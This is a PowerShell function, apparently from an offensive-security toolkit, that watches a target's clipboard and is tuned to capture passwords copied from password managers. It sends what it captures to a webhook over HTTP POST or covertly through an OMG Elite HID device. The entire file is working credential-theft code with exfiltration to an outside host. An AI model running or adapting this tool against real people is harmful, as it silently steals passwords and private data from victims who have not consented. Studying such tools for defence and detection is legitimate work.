function Clipboard-Creep 
{
<#
.SYNOPSIS
Observes the targets clipboard and,depending on the paramters, exfiltrates the content or prints it out to the console.

.DESCRIPTION
Clipboard-Creep observes the targets clipboard every few seconds and enables easy exfiltration through different methods. 
A default of 12 seconds was choosen to capture potential passwords, in clipboards of password managers.

.PARAMETER Webhook
The webhook where data gets send to. Define the URL simply after the paramter and get the incoming clipboard content.

.PARAMETER CovertExfil
This method required an HIDX poc to be successfully imported on the system. In addition to that, an OMG Elite device with actived HIDX is required. (This method is seen as a work in progress POC)

.PARAMETER Sleep
The delay between every observation of the targets clipboard. A default of 12 seconds was choosen to capture potential passwords, in clipboards of password managers.

.EXAMPLE
Output the targets clipboard into the console, every 12 seconds.
Clipboard-Creep

.EXAMPLE
Exfiltrate the targets clipboard content to a defined webhook every 10 seconds.
Clipboard-Creep -Webhook "https://example.com/" -Sleep 10

.LINK
https://github.com/0i41E
#>
    param (
        [int]$Sleep = 12,
        [string]$Webhook,
        # Requires OMG Elite device with firmware 3.0 & HIDX activated
        [switch]$CovertExfil
    )

    $empty = $null

    while ($true) {
        $ClipboardContent = Get-Clipboard

        if ($ClipboardContent) {
            if ($ClipboardContent -ne $empty) {
                $output = "Targets clipboard content: $ClipboardContent"
                # Requires OMG Elite device with firmware 3.0 & HIDX activated
                if ($CovertExfil) {
                    $output | HIDXpoc
                } elseif ($Webhook) {
                    Invoke-RestMethod -Uri $Webhook -Method Post -Body $output
                } else {
                    Write-Host $output
                }
            } else {
                if ($CovertExfil) {
                    $output = "Clipboard content hasn't changed"
                    $output | HIDXpoc
                } elseif ($Webhook) {
                    $output = "Clipboard content hasn't changed"
                    Invoke-RestMethod -Uri $Webhook -Method Post -Body $output
                } else {
                    Write-Host -ForegroundColor Yellow "[+]Clipboard content hasn't changed"
                }
            }
            $empty = $ClipboardContent
        } else {
            if ($CovertExfil) {
                $output = "Clipboard is empty"
                $output | HIDXpoc
            } elseif ($Webhook) {
                $output = "Clipboard is empty"
                Invoke-RestMethod -Uri $Webhook -Method Post -Body $output
            } else {
                Write-Host -ForegroundColor Red "[!]Clipboard is empty"
            }
        }

        Start-Sleep -Seconds $Sleep
    }
}
